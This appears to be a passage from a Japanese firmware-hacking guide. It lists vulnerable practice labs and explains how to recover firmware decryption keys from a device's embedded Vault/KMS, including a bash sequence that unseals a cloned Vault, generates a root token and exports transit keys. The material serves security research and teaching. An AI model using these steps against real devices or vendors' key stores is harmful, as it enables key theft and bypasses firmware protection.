- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault stateからfirmware decryption keyを復元する

Update imageに小さなplaintext metadataと大きな高エントロピーblobが混在している場合、何かをbrute-forceする前にcontainerのトリアージを行います:<sup>[[1]](#references)</sup>

- `hexdump`、`xxd`、`strings -tx`、`base64 -d`、`binwalk -E`を使って、header、offset、行境界をダンプする。
- `Salted__`は通常、OpenSSLの`enc`形式を示す。次の8 bytesがsaltで、残りのbytesがciphertext。
- デコード結果がちょうど`256` bytesのBase64 fieldは、ランダムなfirmware password/session keyをラップしたRSA-2048 ciphertextである可能性が高い。
- 同じファイル内のdetached PGP materialは、多くの場合authenticityのみを保護する。confidentialityの仕組みだと決めつけないこと。

静的なkey探索（`grep`、`strings`、PEM/PGP検索）で見つからない場合は、private keyの検索だけに頼らず、**実際の復号処理経路**をリバースします:

- Updater / management binaryをdecompileし、暗号化されたblobを読み込む処理、その復号に使うhelper/API、および要求する論理key名を追跡する。
- 抽出したroot filesystem内で、KMS state（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`）に加え、unit fileやinit scriptを検索する。
- 平文の`vault operator unseal ...`、recovery key、bootstrap token、またはローカルKMSのauto-unseal scriptは、private key materialと同等に扱う。

デバイスに元のVault binaryとstorage backendが含まれている場合、Vault内部の仕組みを再実装するより、その環境を再現する方が通常は簡単です:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

cloned KMS上でroot権限を取得した状態で:

- transit keysを、隔離されたclone内でのみexport可能にする: `vault write transit/keys/<name>/config exportable=true`
- unwrap keyをexportする: `vault read transit/export/encryption-key/<name>`
- 復元したRSA keyで、KMSが使用する正確なpadding/hashの組み合わせを試す。PKCS#1 v1.5による復号の失敗や、デフォルトのOAEPによる復号の失敗だけでは、keyが間違っている証拠にはならない。Vaultを使うフローの多くはSHA-256を使うOAEPを使用する一方、一般的なライブラリのデフォルトはSHA-1である。
- payloadが`Salted__`で始まる場合は、AES-CBCによる復号を試す前に、ベンダーのOpenSSL KDF（`EVP_BytesToKey`。旧式の機器ではMD5が使われることが多い）を正確に再現する。

これにより、「暗号化されたファームウェア」は、より一般的な問題になる。**機器側の運用鍵を復元し、正確なunwrap + KDFパラメーターをオフラインで再現する。**

## トレーニングと資格

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claudeによるファームウェア解析: シニアレベルのスキル、ジュニアレベルの自律性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [ファームウェアセキュリティテストの方法論](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [実践IoTハッキング: Internet of Thingsを攻撃するための決定版ガイド](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [放置されたハードウェアのzero dayを悪用する – Trail of Bitsブログ](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20ドルのスマートデバイスから、自宅へのアクセスを手に入れた方法](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [miが見えた今、あなたはPwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connectorを充電ポートコネクターから悪用する - Part 2: anti-downgradeのバイパス](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [点滅させよう: Philips Hue BridgeのOver-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU上のTesla OSをROOTする Part 2: デバッグと修正](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
{{#include ../../banners/hacktricks-training.md}}
